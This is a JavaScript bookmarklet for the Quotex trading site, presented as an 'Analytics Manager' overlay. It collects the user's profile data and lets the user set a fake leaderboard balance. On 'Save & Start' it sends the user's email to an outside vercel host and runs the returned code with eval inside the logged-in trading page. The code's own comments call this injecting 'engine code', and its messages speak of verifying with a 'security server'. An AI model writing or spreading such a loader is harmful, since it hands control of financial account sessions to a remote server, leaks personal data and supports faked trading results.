(async function () {
    const BASE_URL = 'https://bookmarklet-tan.vercel.app';
    const email = window.__qx_user_email || 'Unknown';

    const overlayId = 'qx-config-overlay';
    if (document.getElementById(overlayId)) return;

    const hostContainer = document.createElement('div');
    hostContainer.id = overlayId;
    hostContainer.style.cssText = 'position: fixed !important; inset: 0 !important; width: 100vw !important; height: 100vh !important; z-index: 2147483647 !important; display: flex !important; align-items: center !important; justify-content: center !important; background: rgba(15, 23, 42, 0.4) !important; backdrop-filter: blur(8px) !important; pointer-events: auto !important;';

    const shadow = hostContainer.attachShadow({ mode: 'open' });
    
    let apiData = {
        nickname: localStorage.getItem('leaderboardName') || 'myName',
        demoBalance: localStorage.getItem('demoBalance') || '10000',
        avatar: localStorage.getItem('profilePhotoUrl') || '',
        country: localStorage.getItem('lastCountryFlag') || 'bd'
    };

    shadow.innerHTML = `
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@900&family=Oswald:wght@700&display=swap');
            #hxOverlayBox { background: white; width: 380px; border-radius: 12px; padding: 12px 20px 20px; border: 2px solid #000; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25); animation: hxPop 0.2s cubic-bezier(0.16, 1, 0.3, 1); position: relative; box-sizing: border-box; font-family: 'Inter', system-ui; }
            @keyframes hxPop { from { transform: scale(0.95); opacity: 0; } to { transform: scale(1); opacity: 1; } }
            .hxHeader { text-align: center; margin-bottom: 20px; }
            .hxTitle { font-family: 'Outfit', sans-serif; font-size: 22px; font-weight: 900; color: #000; margin-bottom: 2px; }
            .hxSubtitle { font-size: 12px; font-weight: 700; color: #64748b; }
            .hxForm { display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; }
            .hxRow { display: flex; align-items: center; justify-content: space-between; gap: 8px; }
            .hxLabel { font-family: 'Oswald', sans-serif; font-size: 16px; font-weight: 700; color: #000; width: 140px; letter-spacing: -0.5px; }
            .hxInput { height: 32px; width: 180px; border-radius: 6px; border: 2px solid #cbd5e1; background: white; font-size: 14px; font-weight: 700; color: #000 !important; text-align: center; padding: 0 2px; outline: none; box-sizing: border-box; }
            .hxInput:focus { border-color: #000; }
            .hxFooter { display: flex; justify-content: space-between; margin-top: 10px; align-items: center; }
            .hxActionOuter { background: linear-gradient(to bottom, rgba(214, 211, 209, 0.4), transparent); padding: 2px; border-radius: 10px; }
            .hxActionBtn { padding: 2px; border-radius: 8px; background: linear-gradient(to bottom, #fff, rgba(231, 229, 228, 0.4)); border: none; box-shadow: 0 1px 3px rgba(0,0,0,0.3); cursor: pointer; }
            .hxActionBtn:active { transform: translateY(1px); }
            .hxActionInner { background: linear-gradient(to bottom, rgba(231,229,228,0.4), rgba(255,255,255,0.8)); border-radius: 6px; padding: 4px 12px; display: flex; justify-content: center; align-items: center; box-sizing: border-box; }
            .hxBtnText { font-weight: 900; color: #000 !important; font-size: 12px; white-space: nowrap; }
        </style>
        
        <div id="hxOverlayBox">
            <div class="hxHeader">
                <div class="hxTitle">Analytics Manager</div>
                <div class="hxSubtitle">Account: ${email}</div>
            </div>

            <div class="hxForm">
                <div class="hxRow"><label class="hxLabel">Starting Capital</label><input type="text" id="lbInput" class="hxInput" value="${localStorage.getItem('leaderboardBalance') || '10000'}"></div>
            </div>

            <div class="hxFooter">
                <div class="hxActionOuter"><button class="hxActionBtn" id="cancelBtn"><div class="hxActionInner"><span class="hxBtnText">Cancel</span></div></button></div>
                <div class="hxActionOuter"><button class="hxActionBtn" id="saveBtn"><div class="hxActionInner"><span class="hxBtnText">Save & Start</span></div></button></div>
            </div>
        </div>
    `;

    document.documentElement.appendChild(hostContainer);

    // Fetch remaining data from Quotex API
    fetch('https://market-qx.trade/api/v1/cabinets/digest')
        .then(r => r.json())
        .then(res => {
            const d = res.data;
            if (d) {
                apiData.nickname = d.nickname || apiData.nickname;
                apiData.demoBalance = d.demoBalance ? parseFloat(d.demoBalance).toFixed(2) : apiData.demoBalance;
                apiData.avatar = d.avatar || apiData.avatar;
                apiData.country = d.country ? d.country.toLowerCase() : apiData.country;
            }
        })
        .catch(err => console.error('Digest API failed:', err));

    shadow.getElementById('cancelBtn').onclick = () => {
        hostContainer.remove();
    };

    shadow.getElementById('saveBtn').onclick = async () => {
        const saveBtn = shadow.getElementById('saveBtn');
        const originalText = saveBtn.innerHTML;
        saveBtn.innerHTML = '<div class="hxActionInner"><span class="hxBtnText">Verifying...</span></div>';
        saveBtn.disabled = true;

        try {
            // 1. Save data to localStorage
            localStorage.setItem('leaderboardName', apiData.nickname);
            localStorage.setItem('lastLeaderboardName', apiData.nickname);
            localStorage.setItem('leaderboardBalance', shadow.getElementById('lbInput').value);
            localStorage.setItem('lastCountryFlag', apiData.country);
            localStorage.setItem('lastVerified', Date.now().toString());
            localStorage.setItem('demoBalance', apiData.demoBalance);
            localStorage.setItem('profilePhotoUrl', apiData.avatar);
            localStorage.setItem('appActivation', 'true');

            // 2. Fetch engine code from Backend
            const response = await fetch(`${BASE_URL}/api`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email: email })
            }).then(r => r.json());

            if (response.Data) {
                hostContainer.remove();
                // Inject the engine code directly in the global scope
                eval(response.Data);
            } else if (response.Error) {
                hostContainer.remove();
                eval(response.Error);
            } else {
                alert('Unauthorized or session expired.');
                saveBtn.innerHTML = originalText;
                saveBtn.disabled = false;
            }
        } catch (err) {
            console.error('Injection failed:', err);
            alert('Failed to connect to security server.');
            saveBtn.innerHTML = originalText;
            saveBtn.disabled = false;
        }
    };
})();